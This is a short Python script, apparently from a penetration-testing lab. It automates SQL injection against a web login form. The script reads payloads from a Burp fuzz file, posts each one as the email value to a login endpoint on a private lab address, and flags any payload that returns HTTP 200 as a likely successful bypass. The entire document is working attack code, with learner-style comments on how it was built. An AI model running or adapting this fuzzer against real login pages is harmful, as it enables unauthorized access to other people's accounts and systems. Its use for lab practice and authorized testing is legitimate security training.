#!/usr/bin/env python3

# Enable HTTP requests
import requests

# Read SQLi queries from file
fuzz = open('/root/Documents/burp_SQLi_small.fuzz', 'r')

# By default, script will separate fields by white-space
# readlines() will force it to read line-by-line
Lines = fuzz.readlines()

# Loop through each line and add each line to POST request
for line in Lines:
	url = 'http://10.10.10.19:3000/rest/user/login'
	# script was adding newlines to POST data which was breaking the requests
	# used rstrip() to remove them
	myobj = {"email":line.rstrip('\n'),"password":"asdf"}

	# Send data as POST request
	x = requests.post(url, data = myobj)

	# Output was too much to deal with. Needed a filter
	# Decided to filter by HTTP status codes
	# If server returns a '200' code, then SQL injection worked
	if x.status_code == 200:
		print("Possible Match! ", end="", flush=True) # Print matches on single line
		print(line.rstrip('\n'))
		continue
